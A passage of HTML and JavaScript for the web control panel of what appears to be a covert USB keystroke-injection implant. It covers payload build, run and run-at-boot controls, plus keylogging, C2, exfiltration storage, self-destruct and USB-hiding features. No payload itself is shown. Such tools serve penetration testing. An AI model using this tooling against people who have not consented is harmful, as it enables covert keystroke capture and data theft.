			</div><label for="payload" class="hidden">Payload Area</label>
			<div id="footerPayload" class="subnav footer"><button id="footerNavPayloadMenu" onclick="this.classList.toggle('buttonSelectedGrey'); toggleModule('payloadFileMenu');"><svg id="ico_payloadLoad" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>File Menu</span></button> <button id="footerNavPayloadEvalByLine" class="hidden" onclick="applyEffect(this); compileDuckyScriptByLine();"><svg id="ico_payloadBuild" xml:space="preserve" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Build By Line</span></button> <button id="footerNavPayloadRunByLine" class="hidden" onclick="applyEffect(this); runDuckyScriptByLine();"><svg id="ico_payloadRun" xml:space="preserve" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Run By Line</span></button> <button id="footerNavPayloadEval" onclick="applyEffect(this); compileDuckyScript();"><svg id="ico_payloadBuild" xml:space="preserve" viewBox="0 0 40 40" class="iconColor navIcon"></svg> <span>Build</span></button> <button id="footerNavPayloadRun" onclick="document.getElementById(`footerNavPayloadRun`).classList.add(`buttonRunning`); payloadRun();"><svg id="ico_payloadRun" xml:space="preserve" viewBox="0 0 40 40" class="iconColor navIcon"></svg>
					<div>Build + Run</div>
				</button></div>
			<div id="payloadFileMenu" class="hidden footerFullscreen"><button class="closeModal" type="button" onclick="toggleModule('payloadFileMenu', 'close');">&times;</button>
				<h2>File Menu</h2><label>Select Payload</label>
				<div id="fileMenuFlex">
					<div id="columnLeft"><input class="payloadList" type="text" id="payloadSelect" list="payload-list" title="Filename must be in the list - custom names coming soon." oninput="checkInputList(this, 'tooltipPayloadSelect', 'payload-list')"><datalist id="payload-list"></datalist><span class="tooltiptext arrowTop" id="tooltipPayloadSelect"></span></div>
					<div id="columnRight"><button id="payload-loadButton" class="updateButtonLarge buttonMergeLeft" onclick="applyEffect(this); payloadSlotLoad(document.getElementById('payloadSelect').value)">Load</button> <button id="payload-saveButton" class="updateButtonLarge buttonMergeLeft buttonMergeRight" onclick="applyEffect(this); payloadSlotSave(document.getElementById('payloadSelect').value)">Save</button></div>
				</div><span class="bigLabel">Run this payload at boot:</span> <span class="button-container" style="display: inline-block;">
					<div id="payload-bootableToggle" class="toggle-button" onclick="if(this.classList.contains('active')) { payloadSetBootSlot('off'); this.classList.remove('active'); payloadSlotPair('');} else { payloadSetBootSlot('on'); this.classList.add('active'); payloadSlotPair(document.getElementById('payloadSelect').value); };">
						<div class="inner-circle"></div>
					</div>
				</span>
			</div>
		</content>
		<content id="contentArea_syslog" class="hidden"><label for="syslog" class="hidden">Syslog Area</label> <textarea id="syslog" spellcheck="false" class="editorSyslog" readonly="readonly"></textarea> <textarea id="debuglog" class="hidden"></textarea></content>
		<content id="contentArea_c2log" class="hidden"><label for="c2log" class="hidden">c2log Area</label> <textarea id="c2log" spellcheck="false" class="editorc2log" readonly="readonly"></textarea></content>
		<content id="contentArea_debug" class="hidden">
			<div><label for="device-CalibrationStatus">Calibration Status</label> <input id="device-CalibrationStatus" readonly="readonly">
				<div>Calibration Status: <span id="device-CalibrationStatusDecoded" spellcheck="false"></span></div><label for="device-FlashSize">Device Flash Size</label> <input id="device-FlashSize" readonly="readonly"> <label for="device-Uptime">Device Uptime</label> <input id="device-Uptime" readonly="readonly"> <label for="partitionEditorAvailable">Partition Editor Usable Space</label> <input id="partitionEditorAvailable" readonly="readonly"> <label for="bootscriptPair">Bootscript to Payload Pair</label> <input id="bootscriptPair" readonly="readonly">
			</div>
			<div id="keyloggerStatus" class="keylog"></div>
			<div id="CFListResults" class="visible"></div>
			<div id="CTListResults" class="visible"></div>
		</content>
	</div>
	<div id="modal" class="hidden"><button class="closeModal" type="button" onclick="modal('modal', 'close')">&times;</button>
		<h1 id="modalLabel"></h1>
		<div id="modalMessage"></div>
		<div id="modalLoader" class="loader hidden"></div>
		<div id="modalButtons"><button id="modalSave" class="submitButton" onclick="applyEffect(this); downloadModal();">Save Message</button> <button id="modalClose" class="submitButton" onclick="modal(`modal`, 'close')">Close</button></div>
	</div>
	<dialog id="loadingScreen" open>
		<h1>Loading WebUI</h1>
		<div class="loader"></div>
	</dialog>
	<dialog id="keymapViewer"><button class="close-button" type="button" onclick="viewDialog('keymapViewer', 'close');">&times;</button> <span id="keymapViewerLabel">Keymap Viewer</span> <span class="keymapViewerHeader"><input class="keymapping" type="text" placeholder="US" data-keylogger-map-region id="keymapViewerSelect" list="keymap-list"><datalist id="keymap-list"></datalist><button id="update-keymapViewerLocale" class="updateButton" onclick="applyEffect(this); generateKeymap(document.getElementById('keymapViewerSelect').value)">Update</button> <button id="find-keymapViewerLocale" class="updateButton" onclick="applyEffect(this); findKeymap()">Find</button></span>
		<div id="keymap_row1"></div>
		<div id="keymap_row2"></div>
		<div id="keymap_row3"></div>
		<div id="keymap_row4"></div>
		<div id="keymap_row5"></div>
		<div id="keymap_row6"></div>
		<div id="keymapFindList"></div>
	</dialog>
	<dialog id="partitionEditor"><button class="close-button" type="button" onclick="viewDialog('partitionEditor', 'close')">&times;</button>
		<h1 id="partitionEditorLabel">Partition Editor</h1>
		<div id="partitionPayloadConfig">
			<h2>Payloads</h2>
			<div class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">Type</span> <select id="payloadSlotType" onchange="generatePartitionEditor();">
					<option value="1" selected="selected">Editable</option>
					<option value="2">Executable</option>
					<option value="3">Both</option>
				</select></div>
			<div class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">Count</span> <select id="payloadSlotCount" onchange="generatePartitionEditor();"></select></div>
			<div class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">Size</span> <select id="payloadSlotSize" onchange="generatePartitionEditor();">
					<option value="1">x-small</option>
					<option value="2">small</option>
					<option value="4" selected="selected">medium</option>
					<option value="8">large</option>
					<option value="16">x-large</option>
					<option value="32">xx-large</option>
					<option value="64">xxx-large</option>
				</select></div>
			<div class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">Bootscript</span> <select id="bootscriptSlotSize" onchange="generatePartitionEditor();">
					<option value="0">none</option>
					<option value="1">x-small</option>
					<option value="2">small</option>
					<option value="4" selected="selected">medium</option>
					<option value="8">large</option>
					<option value="16">x-large</option>
					<option value="32">xx-large</option>
					<option value="64">xxx-large</option>
				</select></div>
		</div><br>
		<h2>Exfiltration</h2>
		<div id="partitonHidxConfig" class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">HIDX Exfil to File</span> <select id="hidxfileSize" onchange="generatePartitionEditor();">
				<option value="0" selected="selected">none</option>
				<option value="1">4 KB</option>
				<option value="2">8 KB</option>
				<option value="4">16 KB</option>
				<option value="8">32 KB</option>
				<option value="16">64 KB</option>
				<option value="32">128 KB</option>
				<option value="64">256 KB</option>
				<option value="128">512 KB</option>
			</select></div>
		<div id="partitionKeylogConfig" class="partitionEditorFieldWrapper"><span class="partitionEditorFieldLabel">Keylog</span> <span id="keylogSize"></span></div><br><br><button id="partitionEditorDefault" class="submitButton" onclick="partitionEditorApply();">Apply Layout</button>
	</dialog>
	<dialog id="partitionApplied"><button class="closeModal" type="button" onclick="viewDialog('partitonApplied', 'close')">&times;</button>
		<h2>Partition Applied</h2>
		<h4>Your device will now reboot.</h4>
	</dialog>
	<script>
		// Global Variables
		frontendVersionNumber = "3.0-230723";
		let debugLevel = "INFO";
		let liveLogStatus = "off";
		let keylogStatus = "0";
		let slotmode = "1";

		// Global Variables - Connection Info
		var enabledFeatures = [];
		const defaultFeatures = ['global', 'syslog', 'debug'];
		let featureFlags = [];
		let lastMessage = 0;
		var connectionAttempts = 0;
		let previousUptime = Infinity;
		let previousMAC = null;
		let hostname = window.location.hostname;

		// Global Variables - Defaults
		const readSize = 1024;
		const blockSize = 4096;
		let splitPayload = [];
		let splitPayloadCounter = 0;
		let keymapList = [];
		let keymapListPretty = "";
		keymapViewerKeys = [];
		var keymapinverted = "";
		var bootpair;
		var refreshRate = 1;
		var logsIntervalId;
		var adminIntervalId;
		var adminData;
		var c2logAbridge = 0;
		var alwaysDisplayLastPoll = 0;
		var lastDateTime;
		var fccID = "Unknown";
		var crc16 = "";

		// Feature Flags
		const features = {
			'global': {
				'CFError': 'Filesystem Error',
				'CFGet': 'Filesystem Get',
				'CFList': 'Filesystem List',
				'CI': 'Firmware Version',
				'CNGet': 'USB Descriptors Get',
				'CNSet': 'USB Descriptors Set',
				'CR': 'Reboot',
				'CS': 'WiFi Scan',
				'CTErase': 'Setting Erase',
				'CTError': 'Setting Error',
				'CTGet': 'Setting Get',
				'CTList': 'Setting List',
				'CTSet': 'Setting Set',
				'CV': 'System Version',
				'CW': 'WiFi Configure',
				'CWInfo': 'WiFi Show Config',
				'CWStatus': 'WiFi Show Status',
				'FE': 'Flash Erase',
				'FR': 'Flash Read',
				'FW': 'Flash Write',
				'FX': 'Flash Write as Hex',
			},
			'syslog': {},
			'payload': {
				'CE': 'Payload Execute',
				'CEError': 'Payload Error',
				'CEStatus': 'Payload Status',
				'CJ': 'Mouse Jiggler Enable/Disable'
			},
			'debug': {
				'CO': 'Calibration Apply',
				'CPGet': 'Calibration Get Request',
				'CPStart': 'Calibration Generate Request',
				'CZ': 'USB Diagnostic Log',
				'E': 'Echo',
			},
			'keylog': {
				'CLDelete': 'Keylog Delete',
				'CLRead': 'Keylog Read',
				'CLSetCursor': 'Keylog Set Cursor',
				'CLStart': 'Keylog Start',
				'CLStatus': 'Keylog Status',
				'CLStop': 'Keylog Stop',
			},
			'hidx': {
				'CHStart': 'HIDX Start',
				'CHStop': 'HIDX Stop',
				'CHStatus': 'HIDX Status',
				'SFErase': 'Sequential File Erase',
				'SFInfo': 'Sequential File Info',
				'SFRead': 'Sequential File Read',
			},
			'c2': {
				'C2Config': 'C2 Config',
				'C2Status': 'C2 Status',
			},
			'standalone': {},
			'stealth': {
				'CD': 'Self Destruct',
				'CU': 'USB Enumeration Enable/Disable',
			}
		};

		const typeMap = {
			'a': ['* to USB-A Cable', 'red'],
			'c': ['* to USB-C Cable', 'red'],
			'd': ['USB-C Directional Cable', 'red'],
			'p': ['Plug', 'blue'],
			't': ['A to C Adapter', 'red'],
			'default': ['Unknown Device', 'grey'],
		};

		const modelMap = {
			'c': ['Basic', 'BASIC'],
			'k': ['Plus', 'PLUS'],
			'd': ['Elite', 'ELITE'],
			'e': ['Elite', 'ELITE'],
			'default': ['Unknown Device', 'UNKNOWN'],
		};

		const featureFlagMap = {
			'pc': ['global', 'syslog', 'debug', 'payload'],
			'pd': ['global', 'syslog', 'debug', 'payload', 'c2', 'hidx', 'stealth'],
			'xc': ['global', 'syslog', 'debug', 'payload', 'c2', 'hidx', 'stealth'],
			'c': ['global', 'syslog', 'debug', 'payload', 'stealth'],
			'k': ['global', 'syslog', 'debug', 'payload', 'keylog', 'stealth'],
			'e': ['global', 'syslog', 'debug', 'payload', 'keylog', 'c2', 'hidx', 'stealth'],
		};

		const modifiers = {
			'CTRL': 0x01,
			'LCTRL': 0x01,
			'LEFT-CTRL': 0x01,
			'CONTROL': 0x01,
			'LCONTROL': 0x01,
			'LEFT-CONTROL': 0x01,
			'SHIFT': 0x02,
			'LSHIFT': 0x02,
			'LEFT-SHIFT': 0x02,
			'ALT': 0x04,
			'LALT': 0x04,
			'LEFT-ALT': 0x04,
			'OPT': 0x04,
			'LOPT': 0x04,
			'LEFT-OPT': 0x04,
			'OPTION': 0x04,
			'LOPTION': 0x04,
			'LEFT-OPTION': 0x04,
			'CMD': 0x08,
			'LCMD': 0x08,
			'LEFT-CMD': 0x08,
			'COMMAND': 0x08,
			'LCOMMAND': 0x08,
			'LEFT-COMMAND': 0x08,
			'GUI': 0x08,
			'LGUI': 0x08,
			'LEFT-GUI': 0x08,
			'WIN': 0x08,
			'LWIN': 0x08,
			'LEFT-WIN': 0x08,
			'WINDOWS': 0x08,
			'LWINDOWS': 0x08,
			'LEFT-WINDOWS': 0x08,
			'META': 0x08,
			'LMETA': 0x08,
			'LEFT-META': 0x08,
			'SUPER': 0x08,
			'LSUPER': 0x08,
			'LEFT-SUPER': 0x08,
			'RCTRL': 0x10,
			'RIGHT-CTRL': 0x10,
			'RCONTROL': 0x10,
			'RIGHT-CONTROL': 0x10,
			'RSHIFT': 0x20,
			'RIGHT-SHIFT': 0x20,
			'RALT': 0x40,
			'RIGHT-ALT': 0x40,
			'ROPT': 0x40,
			'RIGHT-OPT': 0x40,
			'ROPTION': 0x40,
			'RIGHT-OPTION': 0x40,
			'RCMD': 0x80,
			'RIGHT-CMD': 0x80,
			'RCOMMAND': 0x80,
			'RIGHT-COMMAND': 0x80,
			'RGUI': 0x80,
			'RIGHT-GUI': 0x80,
			'RWIN': 0x80,
			'RIGHT-WIN': 0x80,
			'RWINDOWS': 0x80,
			'RIGHT-WINDOWS': 0x80,
			'RMETA': 0x80,
			'RIGHT-META': 0x80,
			'RSUPER': 0x80,
			'RIGHT-SUPER': 0x80,
		};

		var modifiersInverted = {
			0x01: 'LEFT-CTRL',
			0x02: 'LEFT-SHIFT',
			0x04: 'LEFT-ALT',
			0x08: 'LEFT-GUI',
			0x10: 'RIGHT-CTRL',
			0x20: 'RIGHT-SHIFT',
			0x40: 'RIGHT-ALT',
			0x80: 'RIGHT-GUI',
		};

		// On-Load Config
		document.addEventListener("DOMContentLoaded", async function(event) {
			document.getElementById('debugLevel').value = debugLevel;
			logMessage(`CRIT`, `Frontend Version: ${frontendVersionNumber}`);
			generateKeymapList();
			await toggleFeatureFlags();
			await generateDebugMenu();
			generateHelpMenu();
			generateReleaseTeam();
			generateKeymapViewerMenu();
			generateKeymap('US');
			document.querySelectorAll('code').forEach(element => {
				element.addEventListener('click', handleHelpToPayload);
			});
			window.scrollTo(0, 1);
			const appHeight = () => {
				const doc = document.documentElement
				if (window.visualViewport.height != undefined) {
					doc.style.setProperty('--app-height', `${window.visualViewport.height}px`);
				} else if (window.innerHeight != undefined) {
					doc.style.setProperty('--app-height', `${window.innerHeight}px`);
				} else {
					doc.style.setProperty('--app-height', `100dvh`);
				}
			}
			window.addEventListener('resize', appHeight);
			appHeight();

			const payloadSelect = document.getElementById('payloadSelect');
			const saveBootableButton = document.getElementById('payload-bootableToggle');
			document.getElementById('searchGithubPayloads').addEventListener('keydown', searchGithubPayloads);

			payloadSelect.addEventListener('input', function() {
				if (payloadSelect.value === bootpair) {
					saveBootableButton.classList.add('active');
				} else {
					saveBootableButton.classList.remove('active');
				}
			});

			var payloadEditor = document.getElementById('payload');
			var payloadEditorChangeTimeout = null;
			payloadEditor.addEventListener('input', function() {
				if (payloadEditorChangeTimeout) {
					clearTimeout(payloadEditorChangeTimeout);
				}

				payloadEditorChangeTimeout = setTimeout(function() {
					payloadEditorSavedElement = document.getElementById('payloadEditorSaved');
					payloadEditorSavedElement.innerHTML = "Edited";
					compileDuckyScript();
				}, 10000);
			});

			const colorSlider = document.querySelector("#color-slider");
			const colorBox = document.querySelector("#color-box");
			const applyButton = document.querySelector("#apply-color");

			colorSlider.addEventListener("input", function() {
				const hue = colorSlider.value;
				colorBox.style.backgroundColor = `hsl(${hue}, 100%, 50%)`;
				setAccentColors(hue);
			});

			applyButton.addEventListener("click", function() {
				sendMessage(`CTSet\tuicolor\t${colorSlider.value}`);
			});

		});
		document.onvisibilitychange = function() {
			logMessage(`WARN`, `Browser Visibility Change Detected: [visibilityState]:[${document.visibilityState}]`);
			if (document.visibilityState === 'hidden') {
				logMessage(`INFO`, `Browser Went to Sleep.`);
			} else if (document.visibilityState === 'visible') {
				logMessage(`INFO`, `Browser Resumed from Sleep.`);
			}
		};

		// Data Transform
		function toHex(number, size) {
			if (!size) size = 2;
			number = parseInt(number);
			let b1 = number.toString(16);
			if (b1.length === 1) {
				b1 = 0 + b1;
			}
			b1 = b1.toString();
			while (b1.length < size) b1 = "0" + b1;
			logMessage(`DEBUG`, `toHex: [number]:[${number}] [b1]:[${b1}] [size]:[${size}]`);
			return b1.toUpperCase();
		}

		function padHex(num) {
			return num.toString(16).padStart(2, '0');
		}

		//function padHex(value, digits) {
		//	var hex = parseInt(value).toString(16);
		//	while (hex.length < digits) {
		//		hex = "0" + hex;
		//	}
		//	return hex;
		//}

		function padInput(value, length) {
			value = String(value);
			let len = parseInt(length);
			// console.log(`padInput: [value]:[${value}][${value.length}] [length]:[${length}]`);

			if (isNaN(len) || len <= value.length) {
				return value;
			}

			return value.padStart(len, '0');
		}

		function asciiToHex(str) {
			var arr1 = [];
			for (var n = 0, l = str.length; n < l; n++) {
				var hex = Number(str.charCodeAt(n)).toString(16);
				arr1.push(hex);
			}
			return arr1.join('');
		}

		function unescapeHtml(html) {
			const entitiesMap = {
				'&lt;': '<',
				'&gt;': '>',
				'&amp;': '&',
				'&quot;': '"',
				'&apos;': "'",
				'&nbsp;': ' '
			};

			return html.replace(/&lt;|&gt;|&amp;|&quot;|&apos;|&nbsp;/g, (matched) => {
				return entitiesMap[matched];
			});
		}

		function crc16augccitt(str) {
			let crc = 0x1D0F;
			let polynomial = 0x1021;

			for (let i = 0; i < str.length; i++) {
				let byte = str.charCodeAt(i);
				for (let j = 0; j < 8; j++) {
					let bit = ((byte >> (7 - j) & 1) === 1),
						c15 = ((crc >> 15 & 1) === 1);
					crc <<= 1;
					if (c15 ^ bit) crc ^= polynomial;
				}
			}

			crc &= 0xffff;
			//	console.log(`CRC: [${crc.toString(16).toUpperCase()}]`);
			return crc.toString(16).toUpperCase();
		}


		function bigEndianToLittleEndian(hexString) {
			if (hexString.length % 2 !== 0) {
				console.error('Invalid hex string length. It must be a multiple of 2.');
				return null;
			}

			let littleEndian = '';
			for (let i = 0; i < hexString.length; i += 2) {
				littleEndian = hexString.substring(i, i + 2) + littleEndian;
			}

			return littleEndian;
		}

		function extractArg(args, pattern) {
			const match = args.match(pattern);
			return match ? match[1] : null;
		}

		function sleep(ms) {
			return new Promise(resolve => setTimeout(resolve, ms));
		}

		function toggleClassBasedOnStatus(elementId, className, status, desiredStatus) {
			let element = document.getElementById(elementId);

			if (status === desiredStatus && !element.classList.contains(className)) {
				element.classList.add(className);
			} else if (status !== desiredStatus && element.classList.contains(className)) {
				element.classList.remove(className);
			}
		}

		function toggleModule(moduleName, openClose) {
			const moduleElement = document.getElementById(moduleName);
			const isVisible = moduleElement.classList.contains('visible');
			const shouldOpen = openClose === "open" ? true : (openClose === "close" ? false : !isVisible);

			toggleVisibility(moduleElement, shouldOpen);
		}

		function toggleVisibility(element, isVisible) {
			element.classList.toggle('visible', isVisible);
			element.classList.toggle('hidden', !isVisible);
		}

		function toggleClass(id, class1, class2) {
			const element = document.getElementById(id);
			if (element) {
				element.classList.remove(class1);
				element.classList.add(class2);
			}
		}

		function toggleClassVisibility(id, visibleClassName, isVisible) {
			const element = document.getElementById(id);
			if (element) {
				element.classList.toggle(visibleClassName, isVisible);
				element.classList.toggle('hidden', !isVisible);
			}
		}

		function setElementInnerHTML(id, html) {
			const element = document.getElementById(id);
			if (element) {
				element.innerHTML = html;
			}
		}

		function setElementValue(id, value, prop = 'value') {
			const element = document.getElementById(id);
			if (element) {
				element[prop] = value;
			}
		}

		function modal(moduleName, mode) {
			const targetModule = moduleName === "modal" ? moduleName : `${moduleName}Modal`;
			toggleModule(targetModule, mode);
		}

		function modalCreate(label, message) {
			setElementInnerHTML("modalLabel", label);
			setElementInnerHTML("modalMessage", message);
			toggleModalVisibility(true);
			toggleModule("modal", "open");
		}

		function toggleModalVisibility(visible) {
			const modal = document.getElementById('modal');
			if (modal) {
				modal.classList.toggle('hidden', !visible);
				modal.classList.toggle('visible', visible);
			}
		}

		function colorNameToHue(colorName) {
			const colors = {
				red: 5,
				orange: 25,
				yellow: 45,
				green: 120,
				cyan: 190,
				teal: 210,
				blue: 230,
				purple: 260,
				pink: 300,
				fuchsia: 320,
				maroon: 340,
				brown: 20,
				grey: 0,
			};

			return colors[colorName.toLowerCase()] || 0;
		}

		function setAccentColors(hue) {
			const uiAccentColorMenuSelect = document.getElementById('uiAccentColor');
			const r = document.querySelector(':root');

			if (!isNaN(hue) && hue >= 0 && hue <= 360) {
				hslHue = hue;
				customColor = true;
			} else {
				hslHue = colorNameToHue(hue);
				customColor = false;
			}

			if (hue == "grey") {
				hslSat = "0";
			} else if (hue == "brown") {
				hslSat = "50";
			} else {
				hslSat = "75";
			}

			r.style.setProperty('--accentColor', `hsl(${hslHue}, ${hslSat}%, 32%)`);
			r.style.setProperty('--accentGradient1', `hsl(${hslHue}, ${hslSat}%, 23%)`);
			r.style.setProperty('--accentGradient2', `hsl(${hslHue}, ${hslSat}%, 41%)`);

			if (uiAccentColorMenuSelect && customColor == false) {
				uiAccentColorMenuSelect.value = hue;
			} else {
				customColor = document.getElementById('uicolorCustom');
				customColor.value = hue;
				uiAccentColorMenuSelect.value = hue;
			}
		}

		function hideElementsByClass(...classNames) {
			classNames.forEach((className) => {
				const elements = document.querySelectorAll('.' + className);
				for (const element of elements) {
					element.classList.add('hidden');
				}
			});
		}

		function updateElementValue(id, value, prop = 'value') {
			const element = document.getElementById(id);
			if (element) element[prop] = value;
		}

		function setRadioChecked(id) {
			const element = document.getElementById(id);
			if (element) {
				element.checked = true;
			}
		}

		function processType(type) {
			return typeMap[type] || typeMap['default'];
		}

		function processModel(model) {
			return modelMap[model] || modelMap['default'];
		}

		function contentAreaToggle(moduleName) {
			document.getElementById(`contentArea_keylog`).classList.remove(`visible`);
			document.getElementById(`contentArea_payload`).classList.remove(`visible`);
			document.getElementById(`contentArea_syslog`).classList.remove(`visible`);
			document.getElementById(`contentArea_c2log`).classList.remove(`visible`);
			document.getElementById(`contentArea_debug`).classList.remove(`visible`);
			document.getElementById(`contentArea_keylog`).classList.add(`hidden`);
			document.getElementById(`contentArea_payload`).classList.add(`hidden`);
			document.getElementById(`contentArea_syslog`).classList.add(`hidden`);
			document.getElementById(`contentArea_c2log`).classList.add(`hidden`);
			document.getElementById(`contentArea_debug`).classList.add(`hidden`);
			document.getElementById(`contentSubNav_keylog`).classList.remove(`buttonSelected`);
			document.getElementById(`contentSubNav_payload`).classList.remove(`buttonSelected`);
			document.getElementById(`contentSubNav_syslog`).classList.remove(`buttonSelected`);
			document.getElementById(`contentSubNav_c2log`).classList.remove(`buttonSelected`);
			document.getElementById(`contentSubNav_debug`).classList.remove(`buttonSelected`);
			document.getElementById(`contentArea_${moduleName}`).classList.remove(`hidden`);
			document.getElementById(`contentArea_${moduleName}`).classList.add(`visible`);
			document.getElementById(`contentSubNav_${moduleName}`).classList.remove(`buttonSelected`);
			document.getElementById(`contentSubNav_${moduleName}`).classList.add(`buttonSelected`);
		}

		function sidebarSettingsAreaToggle(moduleName) {
			document.getElementById(`sidebar_settings_queue`).classList.remove(`visible`);
			document.getElementById(`sidebar_settings_net`).classList.remove(`visible`);
			document.getElementById(`sidebar_settings_config`).classList.remove(`visible`);
			document.getElementById(`sidebar_settings_debug`).classList.remove(`visible`);
			document.getElementById(`sidebar_settings_queue`).classList.add(`hidden`);
			document.getElementById(`sidebar_settings_net`).classList.add(`hidden`);
			document.getElementById(`sidebar_settings_config`).classList.add(`hidden`);
			document.getElementById(`sidebar_settings_debug`).classList.add(`hidden`);
			document.getElementById(`sidebarNav_queue`).classList.remove(`buttonSelected`);
			document.getElementById(`sidebarNav_net`).classList.remove(`buttonSelected`);
			document.getElementById(`sidebarNav_config`).classList.remove(`buttonSelected`);
			document.getElementById(`sidebarNav_debug`).classList.remove(`buttonSelected`);
			document.getElementById(`sidebar_settings_${moduleName}`).classList.remove(`hidden`);
			document.getElementById(`sidebar_settings_${moduleName}`).classList.add(`visible`);
			document.getElementById(`sidebarNav_${moduleName}`).classList.remove(`buttonSelected`);
			document.getElementById(`sidebarNav_${moduleName}`).classList.add(`buttonSelected`);
		}

		function sidebarAreaToggle(moduleName) {
			if (moduleName != "close") {
				if (document.getElementById(`sidebar_${moduleName}`).classList.contains(`visible`)) {
					moduleName = "close";
				}
			}
			document.getElementById(`sidebar`).classList.remove(`visible`);
			document.getElementById(`sidebar`).classList.add(`hidden`);
			document.getElementById(`sidebar_settings`).classList.remove(`visible`);
			document.getElementById(`sidebar_settings`).classList.add(`hidden`);
			document.getElementById(`sidebar_about`).classList.remove(`visible`);
			document.getElementById(`sidebar_about`).classList.add(`hidden`);
			document.getElementById(`sidebar_help`).classList.remove(`visible`);
			document.getElementById(`sidebar_help`).classList.add(`hidden`);
			if (moduleName != "close") {
				document.getElementById(`content`).classList.remove(`contentFullscreen`);
				document.getElementById(`content`).classList.add(`contentSidebar`);
				document.getElementById(`payloadFileMenu`).classList.remove(`footerFullscreen`);
				document.getElementById(`payloadFileMenu`).classList.add(`footerSidebar`);
				document.getElementById(`subnav`).classList.remove(`subnavFullscreen`);
				document.getElementById(`subnav`).classList.add(`subnavSidebar`);
				document.getElementById(`sidebar_${moduleName}`).classList.remove(`hidden`);
				document.getElementById(`sidebar_${moduleName}`).classList.add(`visible`);
				document.getElementById(`sidebar`).classList.remove(`hidden`);
				document.getElementById(`sidebar`).classList.add(`visible`);
			} else {
				document.getElementById(`content`).classList.remove(`contentSidebar`);
				document.getElementById(`content`).classList.add(`contentFullscreen`);
				document.getElementById(`payloadFileMenu`).classList.remove(`footerSidebar`);
				document.getElementById(`payloadFileMenu`).classList.add(`footerFullscreen`);
				document.getElementById(`subnav`).classList.remove(`subnavSidebar`);
				document.getElementById(`subnav`).classList.add(`subnavFullscreen`);
			}
		}

		function toggleSignalBars(elements, state) {
			elements.forEach(element => {
				const el = document.getElementById(element);
				el.classList.remove(state === 'on' ? 'wifiSignalOff' : 'wifiSignalOn');
				el.classList.add(state);
			});
		}

		function downloadFile(elementId, fileName, redactPasswords = true) {
			logMessage(`CRIT`, `${fileName}`);
			let text = document.getElementById(elementId).value;

			if (redactPasswords) {
				const wifipass = document.getElementById('device-WIFIPassword').value;
				const re = new RegExp(wifipass.replace(/[.*+\-?^${}()|[\]\\]/g, '\\$&'), 'g');
				text = text.replace(re, '********');
			}

			const textFileAsBlob = new Blob([text], {
				type: 'text/plain'
			});
			const downloadLink = document.createElement("a");
			downloadLink.download = `${fileName}.txt`;
			downloadLink.innerHTML = "Download File";

			const createObjectURL = window.webkitURL ? window.webkitURL.createObjectURL : window.URL.createObjectURL;
			downloadLink.href = createObjectURL(textFileAsBlob);

			if (!window.webkitURL) {
				downloadLink.onclick = destroyClickedElement;
				downloadLink.style.display = "none";
				document.body.appendChild(downloadLink);
			}

			downloadLink.click();
		}

		function downloadModal() {
			const modalName = document.getElementById('modalLabel').innerHTML;
			downloadFile('modalMessage', `${modalName}-log`);
		}

		function saveKeylog() {
			downloadFile('keylog', 'keylog');
		}

		async function toggleFeatureFlags() {
			enabledFeatures = [];
			if (!featureFlags) {
				featureFlags = defaultFeatures;
			}
			for (let i = 0; i < featureFlags.length; i++) {
				if (features[featureFlags[i]]) {
					for (let key in features[featureFlags[i]]) {
						enabledFeatures.push(key);
					}
				}
			}
			logMessage(`CRIT`, `Enabled Features: ${enabledFeatures}`);
			await generateDebugMenu();
		}

		function applyFeatureFlags(type, model) {
			const key = type === 'p' ? type + model : model;
			featureFlags = featureFlagMap[key] || [];

			if (type === 'p' && model === 'c') { // Plug Basic
				hideElementsByClass('selfDestruct', 'keylog', 'c2', 'hidx');
			}
			if (type === 'p' && model === 'd') { // Plug Elite
				hideElementsByClass('keylog');
			}
			if (model === 'c') { // Basic Cable
				hideElementsByClass('keylog', 'c2', 'hidx');
			}
			if (model === 'k') { // Plus Cable
				hideElementsByClass('c2', 'hidx');
			}
		}

		const parseData = (data) => {
			response = data;
			parameters = response.split("\t");
			return {
				response,
				parameters
			};
		};

		const updateElements = (elementMap) => {
			for (const [elementId, value] of Object.entries(elementMap)) {
				updateElement(elementId, value);
			}
		};

		function setElementValues(elementValues, domElement = null, activeClassElements = [], toggleClassElements = []) {
			const valueElements = ['INPUT', 'SELECT', 'OPTION', 'TEXTAREA'];
			const innerHtmlElements = ['DIV', 'SPAN', 'P', 'LI', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'DATA'];

			for (const [elementId, item] of Object.entries(elementValues)) {
				const element = document.getElementById(elementId);

				if (!element) {
					console.warn(`Element with ID: [${elementId}] not found in the DOM.`);
					continue;
				}

				let value;
				let updateMethod;

				if (typeof item === 'object' && item !== null && 'value' in item && 'method' in item) {
					value = item.value;
					updateMethod = item.method;
					element[updateMethod] = value;
				} else {
					value = item;

					if (domElement) {
						updateMethod = domElement;
					} else {
						if (valueElements.includes(element.tagName)) {
							updateMethod = 'value';
						} else if (innerHtmlElements.includes(element.tagName)) {
							updateMethod = 'innerHTML';
						}
					}

					if (updateMethod) {
						element[updateMethod] = value;
					} else {
						console.warn(`Unable to determine update method for element: [elementId]:[${elementId}]. Provided domElement: [${domElement}], element's tagName: [${element.tagName}]. Check if the tagName is supported or the provided domElement parameter is valid.`);
					}
				}

				if (activeClassElements.includes(elementId)) {
					element.classList[value === "1" ? 'add' : 'remove']('active');
				}

				if (toggleClassElements.hasOwnProperty(elementId)) {
					element.classList.toggle(toggleClassElements[elementId]);
				}
			}
		}

		function setElementChecked(id, isChecked) {
			const element = document.getElementById(id);
			if (element) {
				element.checked = isChecked;
			}
		}

		const sendCommands = (commands) => {
			commands.forEach(command => sendMessage(command));
		};

		const handleKey = (key, value, action) => {
			const elementId = key.split('"')[1];
			const elementValue = value.split(':')[1].replace(/"/g, '').trim();
			if (action === 'active') {
				document.getElementById(elementId).classList[elementValue === "1" ? 'add' : 'remove']('active');
			} else if (action === 'value') {
				updateElement(elementId, elementValue);
			}
		};

		function viewDialog(id, action) {
			var dialog = document.getElementById(id);

			if (!dialog) {
				console.error("No dialog found with id:", id);
				return;
			}

			if (action === "open") {
				dialog.setAttribute("open", "");
